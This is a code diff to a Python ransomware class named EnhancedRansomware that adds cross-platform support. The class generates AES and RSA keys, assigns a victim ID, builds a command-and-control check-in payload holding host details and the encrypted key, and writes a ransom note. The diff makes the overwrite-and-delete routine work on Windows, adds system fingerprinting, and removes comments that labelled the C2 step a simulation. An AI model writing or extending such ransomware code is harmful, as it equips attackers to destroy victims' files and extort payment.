@@ -1,6 +1,7 @@
 import os
 import json
 import base64
+import platform
 import uuid
 from pathlib import Path
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -29,7 +30,6 @@ EXCLUDE_DIRS = [  # Directories to avoid
 
 class EnhancedRansomware:
     def __init__(self):
-        # Generate crypto materials
         self.aes_key = os.urandom(32)
         self.rsa_key = rsa.generate_private_key(
             public_exponent=65537,
@@ -39,14 +39,14 @@ class EnhancedRansomware:
         self.victim_id = uuid.uuid4().hex
         self.encrypted_files = []
 
-        # Simulate C2 check-in
-        self._c2_checkin()
+        self._c2_checkin()  # Fixed system info collection
 
     def _c2_checkin(self):
-        """Simulate contact with command-and-control server"""
+        """Cross-platform system information collection"""
+        system_info = f"{platform.system()} {platform.release()} {platform.version()} ({platform.node()})"
         c2_data = {
             'victim_id': self.victim_id,
-            'system_info': str(os.uname()),
+            'system_info': system_info,  # Using platform instead of os.uname()
             'key': base64.b64encode(self._get_encrypted_aes_key()).decode()
         }
         print(f"[*] Simulated C2 Check-In: {json.dumps(c2_data, indent=2)}")
@@ -72,14 +72,16 @@ class EnhancedRansomware:
                 f.write("Send payment and this ID to receive decryption key\n")
 
     def _secure_delete(self, filepath):
-        """Overwrite file before deletion (1-pass)"""
+        """Windows-compatible secure deletion"""
         try:
-            with open(filepath, 'ba+') as f:
-                length = f.tell()
-                f.seek(0)
+            # Use proper file mode for Windows
+            with open(filepath, 'r+b') as f:
+                length = os.path.getsize(filepath)
                 f.write(os.urandom(length))
+                f.flush()
+                os.fsync(f.fileno())
             os.remove(filepath)
-        except Exception:
+        except Exception as e:
             pass
 
     def encrypt_file(self, filepath):
